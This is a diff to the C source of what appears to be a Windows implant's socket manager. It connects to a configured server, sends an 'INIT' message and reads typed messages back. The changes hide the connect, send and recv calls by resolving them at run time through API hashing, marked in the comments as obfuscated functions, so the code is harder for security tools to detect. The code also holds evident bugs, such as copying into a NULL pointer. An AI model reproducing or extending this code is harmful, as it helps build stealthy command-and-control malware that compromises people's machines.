@@ -4,16 +4,19 @@
 #include <time.h>
 #include <stdio.h>
 #include "socketManager.h"
+#include "MessageTypes.h"
+#include "importer/Importer.h"
+#include "Definitions.h"
 
 MESSAGE INIT_MESSAGE = {
     .payload = (PBYTE)"INIT",
     .size = sizeof("INIT"),
-    .type = 0x0A        
+    .type = INIT_TYPE 
 }; 
-
 
 void createSocketManager(PSOCKET_MANAGER pSockManager)
 {
+    /* INITIALIZE WINDOWS SOCKET STRUCTURES*/
     WSADATA wsaData = {0};
     int sStartUp = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (sStartUp != 0)
@@ -22,6 +25,7 @@ void createSocketManager(PSOCKET_MANAGER pSockManager)
         return;
     }
 
+    /* CREATING A WINDOWS SOCKET */
     SOCKET sock = INVALID_SOCKET;
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET)
@@ -42,7 +46,16 @@ void createSocketManager(PSOCKET_MANAGER pSockManager)
         return;
     };
 
-    if (connect(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
+    /* CONNECTION TO THE SERVER */
+
+    /* OBTAIN OBFUSCTED FUNCTION */
+    typedef NTSTATUS(WINAPI* ConnectTominic)(
+		SOCKET      s,
+		const struct sockaddr *name,
+		int         namelen
+	);
+    ConnectTominic connectToMinic =  (ConnectTominic)getProcAddrCen(L"C:\\Windows\\System32\\ws2_32.dll",HASH_CONNECT_FUNCTION);
+    if (connectToMinic(sock, (struct sockaddr *)&sockAddr, sizeof(sockAddr)) != 0)
     {
         printf("[-] connect failed -> %i\n", WSAGetLastError());
         return;
@@ -50,13 +63,14 @@ void createSocketManager(PSOCKET_MANAGER pSockManager)
 
     printf("[+] Socket successfully intialized...\n");
     PSTR auxServerName = NULL;
-    strcpy_s(auxServerName,strlen(SERVER),SERVER);
+    strcpy_s(auxServerName, strlen(SERVER), SERVER);
     SOCKET_MANAGER sManager = {
         .port = PORT,
         .server = auxServerName,
         .s = sock
     };
 
+    /* SENDING INITIAL MESSAGE TO SERVER */
     pSockManager = &sManager;
     sendMessage(pSockManager, &INIT_MESSAGE);
     MESSAGE message = {0};
@@ -67,40 +81,57 @@ void createSocketManager(PSOCKET_MANAGER pSockManager)
 
 BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
 {
-    /*Initialize size variables*/
+    /* INITIALIZE SIZE VARIABLES */
     DWORD size = message->size;
-    DWORD sizeToAlloc = size + sizeof(DWORD) + 1; /* SIZE to alloc is -> size of the payload + size of a DWORD + SIZE of a char */
+    DWORD sizeToAlloc = size + sizeof(DWORD) + 1; // sizeToAlloc is -> size of the payload + size of a DWORD + SIZE of a char
     /*
-    Initialize buffer to send the whole message
+    INITIALIZE BUFFER TO SEND WHOLE MESSAGE
     ------------------------------------------
      ------    -------    ------------------- 
     | TYPE |  | PSIZE |  |      PAYLOAD      |
      ------    -------    -------------------
      1 Byte    4 Bytes        PSIZE Bytes
     ------------------------------------------
-                  SIZE_TO_ALLOC
+                  sizeToAlloc
     */
-    char* data = (char*)VirtualAlloc(NULL, sizeToAlloc, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-
+    char* data = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeToAlloc);
     if (data == NULL)
     {
         printf("[-] VirtualAlloc failed %li", GetLastError());
         return FALSE;
     }
     
-    data[0] = message->type;
+    memcpy(data, &message->type, sizeof(char));
     memcpy((data + 1), &size, sizeof(DWORD));
     memcpy((data + 1 + sizeof(DWORD)), message->payload, size);
 
-    send(sManager->s, data, sizeToAlloc, 0);
+    /* OBTAIN OBFUSCTED FUNCTION */
+    typedef NTSTATUS(WINAPI* SendToMinic)(
+		SOCKET      s,
+		char*       buffer,
+		int         len,
+        int         flags
+	);
+    SendToMinic sendToMinic =  (SendToMinic)getProcAddrCen(L"C:\\Windows\\System32\\ws2_32.dll",HASH_SEND_FUNCTION);
+    sendToMinic(sManager->s, data, sizeToAlloc, 0);
+    HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, data);
     return TRUE;
 }
 
 void receiveMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
 {   
+    /* OBTAIN OBFUSCTED FUNCTION */
+    typedef NTSTATUS(WINAPI* RecvFromMinic)(
+		SOCKET      s,
+		char*       buffer,
+		int         len,
+        int         flags
+	);
+    RecvFromMinic recvFromMinic =  (RecvFromMinic)getProcAddrCen(L"C:\\Windows\\System32\\ws2_32.dll",HASH_RECV_FUNCTION);
+
     /* READING ONE BYTE FOR MESSAGE TYPE */
     char responseType = 0x0;
-    if (recv(sManager->s, &responseType, sizeof(char), 0) == SOCKET_ERROR)
+    if (recvFromMinic(sManager->s, &responseType, sizeof(char), 0) == SOCKET_ERROR)
     {
         printf("[-] recv failed -> %i\n", WSAGetLastError());
         return;
@@ -108,7 +139,7 @@ void receiveMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
     
     /* READING PSIZE_FIELD_SIZE BYTES FOR MESSAGE PAYLOAD SIZE FIELD */
     char size[4];
-    if (recv(sManager->s, size, PSIZE_FIELD_SIZE, 0) == SOCKET_ERROR)
+    if (recvFromMinic(sManager->s, size, PSIZE_FIELD_SIZE, 0) == SOCKET_ERROR)
     {
         printf("[-] recv failed -> %i\n", WSAGetLastError());
         return;
@@ -116,8 +147,8 @@ void receiveMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
 
     /* READING payloadSize BYTES FOR MESSAGE PAYLOAD */
     DWORD payloadSize = (size[0] << 24) | (size[1] << 16) | (size[2] << 8) | (size[3]);
-    char* buffer = (char*)VirtualAlloc(NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-    if (recv(sManager->s, buffer, payloadSize, 0) == SOCKET_ERROR)
+    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
+    if (recvFromMinic(sManager->s, buffer, payloadSize, 0) == SOCKET_ERROR)
     {
         printf("[-] recv failed -> %i\n", WSAGetLastError());
         return;
